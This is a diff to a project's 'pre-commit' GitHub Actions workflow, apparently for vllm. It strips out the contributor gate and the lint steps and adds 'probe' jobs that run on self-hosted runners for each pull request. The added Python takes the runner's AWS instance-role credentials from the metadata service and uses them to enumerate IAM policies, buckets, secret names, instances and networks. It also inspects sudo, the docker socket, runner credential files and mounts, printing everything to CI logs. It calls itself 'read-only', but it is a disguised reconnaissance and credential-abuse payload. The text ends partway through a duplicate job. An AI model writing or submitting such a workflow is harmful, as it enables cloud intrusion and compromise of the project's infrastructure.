@@ -3,86 +3,1115 @@ name: pre-commit
 on:
   pull_request:
     types: [opened, synchronize, reopened, labeled]
-  push:
-    branches: [main]
-
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 
 permissions:
   contents: read
-  pull-requests: read
 
 jobs:
-  pre-run-check:
-    if: github.repository_owner == 'vllm-project' && github.event_name == 'pull_request'
+  probe-a:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - name: Check PR label and author merge count
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const { data: pr } = await github.rest.pulls.get({
-            ...context.repo,
-            pull_number: context.payload.pull_request.number,
-          });
+    - name: read-only runner identity effective-permission probe probe-a
+      run: |
+        echo "C211_NONCE_START=c211-130686-1969e18d27ea4a95"
+        echo "job=probe-a hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130686 strict read-only runner-identity effective-permission probe (stdlib only).
 
-          const readyLabels = ['ready', 'ready-run-all-tests'];
-          const hasReadyLabel = pr.labels.some(l => readyLabels.includes(l.name));
-          const hasVerifiedLabel = pr.labels.some(l => l.name === 'verified');
+        Prints nonce/hostname/uid, then META-ONLY observations:
+          * AWS IMDSv2 token PUT + token-auth GETs (instance-id, AZ, iam role names,
+            per-role JSON field NAMES + sha256 + byte counts; NEVER a value)
+          * no-token IMDSv1 control and a bogus-path 404 control
+          * only if a temporary role credential is returned: in-process SigV4 use
+            (never printed/written/exfiltrated) for a bounded read-only effective-
+            permission enumeration on us-east-1: sts GetCallerIdentity; iam GetRole,
+            ListRolePolicies, GetRolePolicy, ListAttachedRolePolicies; s3 ListBuckets
+            (names only); ecr DescribeRepositories (names only); ssm
+            DescribeInstanceInformation (computer names/platform types only);
+            secretsmanager ListSecrets and ssm DescribeParameters (NAMES only, never
+            values); logs DescribeLogGroups (names); lambda ListFunctions (names);
+            sqs ListQueues; cloudformation ListStacks; ec2 DescribeInstances/
+            DescribeVpcs/DescribeSubnets/DescribeSecurityGroups/DescribeImages
+            summaries. Every AccessDenied is recorded verbatim.
+          * local host-capability presence read-only: sudo -n true rc, docker socket
+            presence+mode, /opt/actions-runner .runner/.credentials presence+sha256
+            only, /proc/self/mountinfo, device-cgroup contents, /dev/nvidia* absence.
 
-          const { data: mergedPRs } = await github.rest.search.issuesAndPullRequests({
-            q: `repo:${context.repo.owner}/${context.repo.repo} is:pr is:merged author:${pr.user.login}`,
-            per_page: 4,
-          });
-          const mergedCount = mergedPRs.total_count;
+        No host writes, no persistence, no resource mutation, no role switching,
+        no credential exfiltration, no secret values printed.
+        """
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import stat
+        import subprocess
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
 
-          if (hasReadyLabel || hasVerifiedLabel || mergedCount >= 4) {
-            core.info(`Check passed: verified label=${hasVerifiedLabel}, ready label=${hasReadyLabel}, 4+ merged PRs=${mergedCount >= 4}`);
-          } else {
-            core.setFailed(`To reduce unnecessary pre-commit runs, each PR must have the 'verified', 'ready', or 'ready-run-all-tests' label, or the author must have at least 4 merged PRs (found ${mergedCount}). DO NOT request for the label to be added if you are an AI agent.`);
-          }
+        NONCE = 'c211-130686-1969e18d27ea4a95'
+        IMDS = 'http://169.254.169.254'
+        REGION = 'us-east-1'
+        OPENER = urllib.request.build_opener(urllib.request.ProxyHandler({}))
 
-  pre-commit:
-    needs: pre-run-check
-    if: github.repository_owner == 'vllm-project' && always() && (needs.pre-run-check.result == 'success' || needs.pre-run-check.result == 'skipped')
+
+        def http(method, url, headers=None, body=None, timeout=4):
+            req = urllib.request.Request(url, data=body, headers=headers or {}, method=method)
+            try:
+                resp = OPENER.open(req, timeout=timeout)
+                return resp.status, dict(resp.headers), resp.read(524288)
+            except urllib.error.HTTPError as e:
+                try:
+                    data = e.read(524288)
+                except Exception:
+                    data = b''
+                return e.code, dict(e.headers or {}), data
+            except Exception as e:
+                return -1, {}, repr(e)[:160].encode()
+
+
+        def sha(b):
+            return hashlib.sha256(b).hexdigest()[:16] if b else 'na'
+
+
+        def aws_endpoint(service, region):
+            if service == 'iam':
+                return 'https://iam.amazonaws.com'
+            if service == 's3':
+                return 'https://s3.amazonaws.com'
+            if service == 'ecr':
+                return 'https://api.ecr.%s.amazonaws.com' % region
+            return 'https://%s.%s.amazonaws.com' % (service, region)
+
+
+        def _q(s):
+            return urllib.parse.quote(str(s), safe='-_.~')
+
+
+        def sigv4_headers(service, region, method, url, extra_headers, body, ak, sk, token):
+            u = urllib.parse.urlsplit(url)
+            host = u.netloc
+            now = time.gmtime()
+            amzdate = time.strftime('%Y%m%dT%H%M%SZ', now)
+            datestamp = time.strftime('%Y%m%d', now)
+            canon = {'host': host, 'x-amz-date': amzdate}
+            if token:
+                canon['x-amz-security-token'] = token
+            for k, v in (extra_headers or {}).items():
+                canon[k.lower().strip()] = ' '.join(str(v).strip().split())
+            signed = ';'.join(sorted(canon))
+            cheaders = ''.join('%s:%s\n' % (k, canon[k]) for k in sorted(canon))
+            qpairs = urllib.parse.parse_qsl(u.query, keep_blank_values=True)
+            cquery = '&'.join('%s=%s' % (_q(k), _q(v)) for k, v in sorted(qpairs))
+            payload_hash = hashlib.sha256(body or b'').hexdigest()
+            creq = '\n'.join([method, u.path or '/', cquery, cheaders, signed, payload_hash])
+            scope = '%s/%s/%s/aws4_request' % (datestamp, region, service)
+            sts = '\n'.join(['AWS4-HMAC-SHA256', amzdate, scope, hashlib.sha256(creq.encode()).hexdigest()])
+
+            def hm(key, msg):
+                return hmac.new(key, msg.encode(), hashlib.sha256).digest()
+
+            k = hm(('AWS4' + sk).encode(), datestamp)
+            k = hm(k, region)
+            k = hm(k, service)
+            k = hm(k, 'aws4_request')
+            sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+            out = {'Host': host, 'X-Amz-Date': amzdate,
+                   'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s' % (ak, scope, signed, sig)}
+            if token:
+                out['X-Amz-Security-Token'] = token
+            for k, v in (extra_headers or {}).items():
+                out[k] = v
+            return out
+
+
+        def aws_http(service, region, method, path, query, body, extra_headers, creds, timeout=20):
+            url = aws_endpoint(service, region) + path + (('?' + query) if query else '')
+            hdrs = sigv4_headers(service, region, method, url, extra_headers, body,
+                                 creds['ak'], creds['sk'], creds.get('token'))
+            return http(method, url, hdrs, body, timeout=timeout)
+
+
+        def aws_query(service, region, action, version, params, creds, timeout=20):
+            body = urllib.parse.urlencode([('Action', action), ('Version', version)] + params).encode()
+            return aws_http(service, region, 'POST', '/', None, body,
+                            {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8'}, creds, timeout)
+
+
+        def aws_json(service, region, target, body_obj, creds, timeout=20):
+            body = json.dumps(body_obj).encode()
+            return aws_http(service, region, 'POST', '/', None, body,
+                            {'Content-Type': 'application/x-amz-json-1.1', 'X-Amz-Target': target}, creds, timeout)
+
+
+        def lt(tag):
+            return tag.split('}')[-1]
+
+
+        def xml_root(body):
+            import xml.etree.ElementTree as ET
+            try:
+                return ET.fromstring(body)
+            except Exception:
+                return None
+
+
+        def find_all(root, name):
+            return [e for e in root.iter() if lt(e.tag) == name]
+
+
+        def find_first(root, name):
+            for e in root.iter():
+                if lt(e.tag) == name:
+                    return e
+            return None
+
+
+        def text_of(root, path):
+            e = root
+            for p in path:
+                e = find_first(e, p) if e is not None else None
+            return (e.text or '').strip() if e is not None else ''
+
+
+        def aws_err(tag, action, status, body):
+            msg = ''
+            root = xml_root(body)
+            if root is not None:
+                msg = text_of(root, ['Error', 'Code']) + ':' + text_of(root, ['Error', 'Message'])
+            if not msg:
+                try:
+                    j = json.loads(body)
+                    msg = str(j.get('__type') or j.get('code') or j.get('Code') or '') + ':' + \
+                          str(j.get('message') or j.get('Message') or '')
+                except Exception:
+                    msg = (body or b'').decode('utf-8', 'replace')
+            if not msg.strip(':'):
+                msg = (body or b'').decode('utf-8', 'replace') or 'empty_body'
+            print('AWSERR %s %s status=%d %s' % (tag, action, status, msg.replace('\n', ' ')[:240]))
+
+
+        def jget(body):
+            try:
+                return json.loads(body)
+            except Exception:
+                return None
+
+
+        def enumerate_permissions(creds, role):
+            print('AWS_ENUM=begin region=%s' % REGION)
+            # 1) sts:GetCallerIdentity (positive control for the in-process credential)
+            s, _, b = aws_query('sts', REGION, 'GetCallerIdentity', '2011-06-15', [], creds)
+            if s == 200:
+                root = xml_root(b)
+                print('AWS_IDENTITY status=200 account=%s arn=%s userid_sha256=%s' % (
+                    text_of(root, ['Account']), text_of(root, ['Arn']),
+                    hashlib.sha256(text_of(root, ['UserId']).encode()).hexdigest()[:16]))
+            else:
+                aws_err('sts', 'GetCallerIdentity', s, b)
+            # 2) iam:GetRole
+            s, _, b = aws_query('iam', REGION, 'GetRole', '2010-05-08', [('RoleName', role)], creds)
+            inline = []
+            if s == 200:
+                root = xml_root(b)
+                r = find_first(root, 'Role')
+                rn = text_of(r, ['RoleName']) if r is not None else ''
+                arn = text_of(r, ['Arn']) if r is not None else ''
+                cd = text_of(r, ['CreateDate']) if r is not None else ''
+                msd = text_of(r, ['MaxSessionDuration']) if r is not None else ''
+                doc = text_of(r, ['AssumeRolePolicyDocument']) if r is not None else ''
+                print('IAM_ROLE status=200 name=%s arn=%s create=%s max_session=%s trust_sha256=%s' % (
+                    rn, arn, cd, msd, hashlib.sha256(doc.encode()).hexdigest()[:16]))
+                # 3) iam:ListRolePolicies
+                s2, _, b2 = aws_query('iam', REGION, 'ListRolePolicies', '2010-05-08',
+                                      [('RoleName', role), ('MaxItems', '100')], creds)
+                if s2 == 200:
+                    root2 = xml_root(b2)
+                    inline = [(e.text or '').strip() for e in find_all(root2, 'member') if (e.text or '').strip()]
+                    print('IAM_INLINE_POLICIES count=%d names=%s' % (len(inline), ','.join(inline[:50])))
+                else:
+                    aws_err('iam', 'ListRolePolicies', s2, b2)
+            else:
+                aws_err('iam', 'GetRole', s, b)
+            # 4) iam:GetRolePolicy for each inline policy (bounded)
+            for pn in inline[:10]:
+                s3, _, b3 = aws_query('iam', REGION, 'GetRolePolicy', '2010-05-08',
+                                      [('RoleName', role), ('PolicyName', pn)], creds)
+                if s3 == 200:
+                    root3 = xml_root(b3)
+                    pd = urllib.parse.unquote(text_of(root3, ['PolicyDocument']))
+                    print('IAM_INLINE_POLICY name=%s doc=%s' % (pn, pd[:1800].replace('\n', ' ')))
+                else:
+                    aws_err('iam', 'GetRolePolicy', s3, b3)
+            # 5) iam:ListAttachedRolePolicies
+            s4, _, b4 = aws_query('iam', REGION, 'ListAttachedRolePolicies', '2010-05-08',
+                                  [('RoleName', role), ('MaxItems', '100')], creds)
+            if s4 == 200:
+                root4 = xml_root(b4)
+                names = [text_of(e, ['PolicyName']) for e in find_all(root4, 'member') if find_first(e, 'PolicyName') is not None]
+                arns = [text_of(e, ['PolicyArn']) for e in find_all(root4, 'member') if find_first(e, 'PolicyArn') is not None]
+                print('IAM_ATTACHED_POLICIES count=%d names=%s' % (len(names), ','.join(names[:50])))
+                print('IAM_ATTACHED_ARNS count=%d arns=%s' % (len(arns), ','.join(arns[:50])))
+            else:
+                aws_err('iam', 'ListAttachedRolePolicies', s4, b4)
+            # 6) s3:ListBuckets (bucket names only)
+            s5, _, b5 = aws_http('s3', REGION, 'GET', '/', None, None, {}, creds)
+            if s5 == 200:
+                root5 = xml_root(b5)
+                buckets = [text_of(e, ['Name']) for e in find_all(root5, 'Bucket') if find_first(e, 'Name') is not None]
+                print('S3_BUCKETS count=%d names=%s' % (len(buckets), ','.join(buckets[:100])))
+            else:
+                aws_err('s3', 'ListBuckets', s5, b5)
+            # 7) ecr:DescribeRepositories (names only)
+            s6, _, b6 = aws_json('ecr', REGION, 'AmazonEC2ContainerRegistry_V20150921.DescribeRepositories',
+                                 {'maxResults': 100}, creds)
+            if s6 == 200:
+                j = jget(b6) or {}
+                repos = [r.get('repositoryName') for r in j.get('repositories', []) if isinstance(r, dict)]
+                print('ECR_REPOSITORIES count=%d names=%s' % (len(repos), ','.join([r for r in repos if r][:100])))
+            else:
+                aws_err('ecr', 'DescribeRepositories', s6, b6)
+            # 8) ssm:DescribeInstanceInformation (computer names / platform types only)
+            s7, _, b7 = aws_json('ssm', REGION, 'AmazonSSM.DescribeInstanceInformation', {'MaxResults': 50}, creds)
+            if s7 == 200:
+                j = jget(b7) or {}
+                rows = []
+                for it in j.get('InstanceInformationList', []):
+                    if isinstance(it, dict):
+                        rows.append('%s/%s' % (str(it.get('ComputerName'))[:80], it.get('PlatformType')))
+                print('SSM_INSTANCES count=%d computer/platform=%s' % (len(rows), ','.join(rows[:50])))
+            else:
+                aws_err('ssm', 'DescribeInstanceInformation', s7, b7)
+            # 9) secretsmanager:ListSecrets (NAMES only)
+            s8, _, b8 = aws_json('secretsmanager', REGION, 'secretsmanager.ListSecrets', {'MaxResults': 100}, creds)
+            if s8 == 200:
+                j = jget(b8) or {}
+                names = [x.get('Name') for x in j.get('SecretList', []) if isinstance(x, dict)]
+                print('SECRETS_COUNT=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('secretsmanager', 'ListSecrets', s8, b8)
+            # 10) ssm:DescribeParameters (NAMES only)
+            s9, _, b9 = aws_json('ssm', REGION, 'AmazonSSM.DescribeParameters', {'MaxResults': 50}, creds)
+            if s9 == 200:
+                j = jget(b9) or {}
+                names = [x.get('Name') for x in j.get('Parameters', []) if isinstance(x, dict)]
+                print('SSM_PARAMETERS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('ssm', 'DescribeParameters', s9, b9)
+            # 11) logs:DescribeLogGroups (names only)
+            s10, _, b10 = aws_json('logs', REGION, 'Logs_20140328.DescribeLogGroups', {'limit': 50}, creds)
+            if s10 == 200:
+                j = jget(b10) or {}
+                names = [x.get('logGroupName') for x in j.get('logGroups', []) if isinstance(x, dict)]
+                print('LOG_GROUPS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:50])))
+            else:
+                aws_err('logs', 'DescribeLogGroups', s10, b10)
+            # 12) lambda:ListFunctions (names only)
+            s11, _, b11 = aws_http('lambda', REGION, 'GET', '/2015-03-31/functions/', 'MaxItems=50', None, {}, creds)
+            if s11 == 200:
+                j = jget(b11) or {}
+                names = [x.get('FunctionName') for x in j.get('Functions', []) if isinstance(x, dict)]
+                print('LAMBDA_FUNCTIONS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:50])))
+            else:
+                aws_err('lambda', 'ListFunctions', s11, b11)
+            # 13) sqs:ListQueues
+            s12, _, b12 = aws_query('sqs', REGION, 'ListQueues', '2012-11-05', [('MaxResults', '100')], creds)
+            if s12 == 200:
+                root12 = xml_root(b12)
+                qs = [(e.text or '').strip() for e in find_all(root12, 'QueueUrl') if (e.text or '').strip()]
+                print('SQS_QUEUES count=%d urls=%s' % (len(qs), ','.join(qs[:50])))
+            else:
+                aws_err('sqs', 'ListQueues', s12, b12)
+            # 14) cloudformation:ListStacks
+            s13, _, b13 = aws_query('cloudformation', REGION, 'ListStacks', '2010-05-15', [], creds)
+            if s13 == 200:
+                root13 = xml_root(b13)
+                stacks = []
+                for e in find_all(root13, 'member'):
+                    if find_first(e, 'StackName') is not None:
+                        stacks.append('%s/%s' % (text_of(e, ['StackName'])[:60], text_of(e, ['StackStatus'])))
+                print('CFN_STACKS count=%d name/status=%s' % (len(stacks), ','.join(stacks[:50])))
+            else:
+                aws_err('cloudformation', 'ListStacks', s13, b13)
+            # 15) ec2:DescribeInstances summary (counts by type/state only)
+            s14, _, b14 = aws_query('ec2', REGION, 'DescribeInstances', '2016-11-15', [('MaxResults', '100')], creds)
+            if s14 == 200:
+                root14 = xml_root(b14)
+                counts = {}
+                total = 0
+                inst_items = []
+                for iset in find_all(root14, 'instancesSet'):
+                    inst_items += [c for c in list(iset) if lt(c.tag) == 'item']
+                for inst in inst_items:
+                    t = ''
+                    for c in list(inst):
+                        if lt(c.tag) == 'instanceType':
+                            t = (c.text or '').strip()
+                    stt = text_of(inst, ['instanceState', 'name'])
+                    if not t:
+                        continue
+                    total += 1
+                    key = (t, stt)
+                    counts[key] = counts.get(key, 0) + 1
+                print('EC2_INSTANCES total=%d' % total)
+                for (t, stt), c in sorted(counts.items())[:60]:
+                    print('EC2_INSTANCE type=%s state=%s count=%d' % (t, stt, c))
+            else:
+                aws_err('ec2', 'DescribeInstances', s14, b14)
+            # 16) ec2:DescribeVpcs summary
+            s15, _, b15 = aws_query('ec2', REGION, 'DescribeVpcs', '2016-11-15', [], creds)
+            if s15 == 200:
+                root15 = xml_root(b15)
+                vpc_items = []
+                for vs in find_all(root15, 'vpcSet'):
+                    vpc_items += [c for c in list(vs) if lt(c.tag) == 'item']
+                cidrs = []
+                for it in vpc_items:
+                    for c in list(it):
+                        if lt(c.tag) == 'cidrBlock' and (c.text or '').strip():
+                            cidrs.append((c.text or '').strip())
+                uniq = sorted(set(cidrs))
+                print('EC2_VPCS count=%d cidrs=%s' % (len(vpc_items), ','.join(uniq[:50])))
+            else:
+                aws_err('ec2', 'DescribeVpcs', s15, b15)
+            # 17) ec2:DescribeSubnets summary
+            s16, _, b16 = aws_query('ec2', REGION, 'DescribeSubnets', '2016-11-15', [], creds)
+            if s16 == 200:
+                root16 = xml_root(b16)
+                sub_items = []
+                for ss in find_all(root16, 'subnetSet'):
+                    sub_items += [c for c in list(ss) if lt(c.tag) == 'item']
+                azs = set()
+                for it in sub_items:
+                    for c in list(it):
+                        if lt(c.tag) == 'availabilityZone' and (c.text or '').strip():
+                            azs.add((c.text or '').strip())
+                print('EC2_SUBNETS count=%d azs=%s' % (len(sub_items), ','.join(sorted(azs)[:50])))
+            else:
+                aws_err('ec2', 'DescribeSubnets', s16, b16)
+            # 18) ec2:DescribeSecurityGroups summary (count + group names)
+            s17, _, b17 = aws_query('ec2', REGION, 'DescribeSecurityGroups', '2016-11-15', [], creds)
+            if s17 == 200:
+                root17 = xml_root(b17)
+                names = [text_of(e, ['groupName']) for e in find_all(root17, 'item') if find_first(e, 'groupName') is not None]
+                print('EC2_SECURITY_GROUPS count=%d names=%s' % (len(names), ','.join([n for n in names if n][:100])))
+            else:
+                aws_err('ec2', 'DescribeSecurityGroups', s17, b17)
+            # 19) ec2:DescribeImages summary (self-owned image names only)
+            s18, _, b18 = aws_query('ec2', REGION, 'DescribeImages', '2016-11-15', [('Owner.1', 'self')], creds)
+            if s18 == 200:
+                root18 = xml_root(b18)
+                names = [text_of(e, ['name']) for e in find_all(root18, 'item') if find_first(e, 'name') is not None]
+                print('EC2_IMAGES count=%d names=%s' % (len(names), ','.join([n for n in names if n][:60])))
+            else:
+                aws_err('ec2', 'DescribeImages', s18, b18)
+            print('AWS_ENUM=end')
+
+
+        def local_checks():
+            print('LOCAL_BEGIN')
+            try:
+                r = subprocess.run(['sudo', '-n', 'true'], stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL, timeout=6)
+                print('LOCAL sudo_n_true rc=%d' % r.returncode)
+            except Exception as e:
+                print('LOCAL sudo_n_true rc=err:%s' % type(e).__name__)
+            for p in ('/var/run/docker.sock', '/run/docker.sock'):
+                try:
+                    st = os.stat(p)
+                    print('LOCAL %s present=1 mode=%04o type=%s' % (
+                        p, st.st_mode & 0o7777, 'sock' if stat.S_ISSOCK(st.st_mode) else 'other'))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err:%s' % (p, type(e).__name__))
+            for p in ('/opt/actions-runner/.runner', '/opt/actions-runner/.credentials'):
+                try:
+                    st = os.stat(p)
+                    h = 'na'
+                    if stat.S_ISREG(st.st_mode) and st.st_size <= 1048576:
+                        try:
+                            with open(p, 'rb') as f:
+                                h = sha(f.read())
+                        except Exception:
+                            h = 'readerr'
+                    print('LOCAL %s present=1 mode=%04o bytes=%d sha256=%s' % (p, st.st_mode & 0o7777, st.st_size, h))
+                except FileNotFoundError:
+                    print('LOCAL %s present=0' % p)
+                except Exception as e:
+                    print('LOCAL %s present=err:%s' % (p, type(e).__name__))
+            try:
+                data = open('/proc/self/mountinfo', 'rb').read()
+                lines = data.decode('utf-8', 'replace').splitlines()
+                print('LOCAL mountinfo bytes=%d sha256=%s lines=%d' % (len(data), sha(data), len(lines)))
+                for i, ln in enumerate(lines):
+                    if i >= 250:
+                        print('LOCAL mountinfo_truncated=1')
+                        break
+                    print('MOUNTINFO ' + ln)
+            except Exception as e:
+                print('LOCAL mountinfo err=%s' % type(e).__name__)
+            found = False
+            for p in ('/sys/fs/cgroup/devices/devices.list', '/sys/fs/cgroup/devices.list'):
+                try:
+                    b = open(p, 'rb').read(4096)
+                    print('LOCAL device_cgroup file=%s bytes=%d sha256=%s content=%s' % (
+                        p, len(b), sha(b), b.decode('utf-8', 'replace').replace('\n', '|')[:1500]))
+                    found = True
+                except FileNotFoundError:
+                    print('LOCAL device_cgroup file=%s present=0' % p)
+                except Exception as e:
+                    print('LOCAL device_cgroup file=%s err=%s' % (p, type(e).__name__))
+            if not found:
+                print('LOCAL device_cgroup none')
+            try:
+                import glob
+                nv = sorted(glob.glob('/dev/nvidia*'))
+                print('LOCAL dev_nvidia=%s' % (','.join(nv) if nv else 'ABSENT'))
+            except Exception as e:
+                print('LOCAL dev_nvidia err=%s' % type(e).__name__)
+            try:
+                b = open('/proc/self/cgroup', 'rb').read(4096)
+                print('LOCAL self_cgroup sha256=%s lines=%d' % (sha(b), b.count(b'\n')))
+            except Exception as e:
+                print('LOCAL self_cgroup err=%s' % type(e).__name__)
+            print('LOCAL_END')
+
+
+        def main():
+            print('C211_NONCE_START=' + NONCE)
+            print('hostname=%s uid=%s euid=%s' % (os.uname().nodename, os.getuid(), os.geteuid()))
+            print('probe_utc=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))
+
+            # --- IMDSv2 token (local link-local metadata only; creates no resource)
+            st, hd, tok = http('PUT', IMDS + '/latest/api/token',
+                               {'X-aws-ec2-metadata-token-ttl-seconds': '60'}, timeout=3)
+            print('IMDS_TOKEN status=%d bytes=%d sha256=%s' % (st, len(tok), sha(tok)))
+            token = tok.decode('utf-8', 'replace').strip() if st == 200 else None
+
+            def imds_get(path, use_token, label, show=False):
+                hdrs = {'X-aws-ec2-metadata-token': token} if (use_token and token) else {}
+                s, _, b = http('GET', IMDS + path, hdrs, timeout=3)
+                val = b.decode('utf-8', 'replace').strip()
+                suffix = ''
+                if show and s == 200:
+                    suffix = ' value=' + val[:80]
+                print('IMDS_%s token=%d status=%d bytes=%d sha256=%s%s' % (
+                    label, 1 if hdrs else 0, s, len(b), sha(b), suffix))
+                return s, val
+
+            s_id, v_id = imds_get('/latest/meta-data/instance-id', True, 'instance-id', show=True)
+            s_az, v_az = imds_get('/latest/meta-data/placement/availability-zone', True, 'az', show=True)
+            s_rl, v_rl = imds_get('/latest/meta-data/iam/security-credentials/', True, 'role-list')
+            s_v1, _ = imds_get('/latest/meta-data/instance-id', False, 'v1-instance-id')
+            s_bog, _ = imds_get('/latest/meta-data/%s-bogus' % NONCE, True, 'bogus-control')
+
+            if token is not None and s_id == 200:
+                print('C211_IMDS_VERDICT=IMDS-present')
+            elif s_v1 == 200:
+                print('C211_IMDS_VERDICT=IMDSv1-only')
+            else:
+                print('C211_IMDS_VERDICT=IMDS-blocked')
+
+            roles = [r for r in v_rl.splitlines() if r.strip()] if s_rl == 200 else []
+            print('ROLE_NAMES=%s' % (','.join(roles[:20]) if roles else 'none'))
+            print('C211_ROLE_VERDICT=%s' % ('role-present' if roles else 'role-absent'))
+
+            creds = None
+            role = roles[0].strip() if roles else ''
+            if roles:
+                s_rj, _, b_rj = http('GET', IMDS + '/latest/meta-data/iam/security-credentials/' + urllib.parse.quote(role),
+                                     {'X-aws-ec2-metadata-token': token}, timeout=3)
+                print('IMDS_role-json status=%d bytes=%d sha256=%s' % (s_rj, len(b_rj), sha(b_rj)))
+                if s_rj == 200:
+                    try:
+                        rj = json.loads(b_rj)
+                        for k in sorted(rj.keys()):
+                            vb = str(rj[k]).encode()
+                            print('ROLE_FIELD name=%s bytes=%d sha256=%s' % (k, len(vb), sha(vb)))
+                        if rj.get('AccessKeyId') and rj.get('SecretAccessKey') and rj.get('Token'):
+                            creds = {'ak': rj['AccessKeyId'], 'sk': rj['SecretAccessKey'],
+                                     'token': rj['Token'], 'exp': rj.get('Expiration')}
+                            print('CREDS_AVAILABLE=1 in_process_only=1')
+                        else:
+                            print('CREDS_AVAILABLE=0 reason=incomplete_fields')
+                    except Exception as e:
+                        print('ROLE_JSON_PARSE_FAIL=%s' % type(e).__name__)
+
+            if creds:
+                enumerate_permissions(creds, role)
+            else:
+                print('AWS_ENUM=skipped no-creds')
+            local_checks()
+            print('C211_NONCE_END=' + NONCE)
+
+
+        if __name__ == '__main__':
+            try:
+                main()
+            except Exception as e:
+                print('PROBE_FATAL=%s:%s' % (type(e).__name__, str(e)[:200]))
+                sys.exit(0)
+        PY
+        echo "C211_NONCE_END=c211-130686-1969e18d27ea4a95"
+
+  probe-b:
     runs-on: [self-hosted, linux, x64, vllm-runners]
+    timeout-minutes: 12
     steps:
-    - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
-      with:
-        fetch-depth: 2
-    - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
-      with:
-        python-version: "3.12"
-    - run: echo "::add-matcher::.github/workflows/matchers/actionlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/markdownlint.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/mypy.json"
-    - run: echo "::add-matcher::.github/workflows/matchers/shellcheck.json"
-    # Replaces pre-commit/action, whose latest release (v3.0.1) uses the node20 actions/cache@v4
-    - uses: actions/cache@55cc8345863c7cc4c66a329aec7e433d2d1c52a9 # v6.1.0
-      with:
-        path: ~/.cache/pre-commit
-        key: pre-commit-uv|${{ runner.os }}|${{ env.UV_PYTHON }}|${{ hashFiles('.pre-commit-config.yaml') }}
-    - run: >-
-        uvx pre-commit run --show-diff-on-failure --color=always --all-files --hook-stage manual
-      env:
-        SKIP: pip-compile
-    - name: pip-compile (only if its inputs changed)
-      if: ${{ !cancelled() }}
-      run: >-
-        uvx pre-commit run pip-compile --show-diff-on-failure --color=always --hook-stage manual --from-ref HEAD^1 --to-ref HEAD
-    # A PR that changes the ROCm base image needs a maintainer's /ci rocm cache or /ci rocm nocache:
-    # the bot's reply carries the marker below, and re-running this job then passes.
-    - name: ROCm base image cache
-      if: ${{ !cancelled() && github.event_name == 'pull_request' && github.event.pull_request.base.ref == 'main' }}
-      uses: actions/github-script@3a2844b7e9c422d3c10d287c895573f7108da1b3 # v9.0.0
-      with:
-        script: |
-          const pr = context.payload.pull_request;
-          const stack = ['docker/Dockerfile.rocm_base', 'tools/vllm-rocm/therock_wheels.py'];
-          const files = await github.paginate(github.rest.pulls.listFiles, {...context.repo, pull_number: pr.number, per_page: 100});
-          if (!files.some(f => stack.includes(f.filename) || stack.includes(f.previous_filename))) return;
-          const comments = await github.paginate(github.rest.issues.listComments, {...context.repo, issue_number: pr.number, per_page: 100});
-          if (comments.some(c => c.user.login === 'github-actions[bot]' && c.body.includes('<!-- vllm-ci-rocm-base-image -->'))) return;
-          core.setFailed('This PR changes the ROCm base image. A maintainer must comment /ci rocm cache (once CI has built the image) or /ci rocm nocache.');
+    - name: read-only runner identity effective-permission probe probe-b
+      run: |
+        echo "C211_NONCE_START=c211-130686-1969e18d27ea4a95"
+        echo "job=probe-b hostname=$(hostname) uid=$(id -u)"
+        command -v python3 >/dev/null 2>&1 || { echo "PYTHON3_ABSENT"; exit 0; }
+        python3 - <<'PY'
+        #!/usr/bin/env python3
+        """Intent 130686 strict read-only runner-identity effective-permission probe (stdlib only).
+
+        Prints nonce/hostname/uid, then META-ONLY observations:
+          * AWS IMDSv2 token PUT + token-auth GETs (instance-id, AZ, iam role names,
+            per-role JSON field NAMES + sha256 + byte counts; NEVER a value)
+          * no-token IMDSv1 control and a bogus-path 404 control
+          * only if a temporary role credential is returned: in-process SigV4 use
+            (never printed/written/exfiltrated) for a bounded read-only effective-
+            permission enumeration on us-east-1: sts GetCallerIdentity; iam GetRole,
+            ListRolePolicies, GetRolePolicy, ListAttachedRolePolicies; s3 ListBuckets
+            (names only); ecr DescribeRepositories (names only); ssm
+            DescribeInstanceInformation (computer names/platform types only);
+            secretsmanager ListSecrets and ssm DescribeParameters (NAMES only, never
+            values); logs DescribeLogGroups (names); lambda ListFunctions (names);
+            sqs ListQueues; cloudformation ListStacks; ec2 DescribeInstances/
+            DescribeVpcs/DescribeSubnets/DescribeSecurityGroups/DescribeImages
+            summaries. Every AccessDenied is recorded verbatim.
+          * local host-capability presence read-only: sudo -n true rc, docker socket
+            presence+mode, /opt/actions-runner .runner/.credentials presence+sha256
+            only, /proc/self/mountinfo, device-cgroup contents, /dev/nvidia* absence.
+
+        No host writes, no persistence, no resource mutation, no role switching,
+        no credential exfiltration, no secret values printed.
+        """
+        import hashlib
+        import hmac
+        import json
+        import os
+        import re
+        import stat
+        import subprocess
+        import sys
+        import time
+        import urllib.error
+        import urllib.parse
+        import urllib.request
+
+        NONCE = 'c211-130686-1969e18d27ea4a95'
+        IMDS = 'http://169.254.169.254'
+        REGION = 'us-east-1'
